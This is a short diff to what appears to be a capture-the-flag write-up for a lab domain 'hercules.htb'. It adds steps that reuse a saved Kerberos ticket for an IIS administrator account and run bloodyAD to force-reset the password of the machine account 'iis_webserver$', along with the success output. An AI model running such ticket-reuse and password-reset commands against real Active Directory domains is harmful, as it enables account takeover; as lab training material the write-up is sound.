@@ -1536,8 +1536,19 @@ SMB         dc.hercules.htb 445    dc               [+] hercules.htb\iis_adminis
 SMB         dc.hercules.htb 445    dc               [+] TGT saved to: iisadmin.ccache
 SMB         dc.hercules.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=iisadmin.ccache
 
-
+export KRB5CCNAME=iisadmin.ccache
 ```
+
+Then ill get a TGT and export it
+
+```python
+bloodyAD --host dc.hercules.htb -d hercules.htb -k set password 'iis_webserver$' 'Password123!'
+[+] Password changed successfully!
+```
+
+Then change the password!
+
+
 
 
 
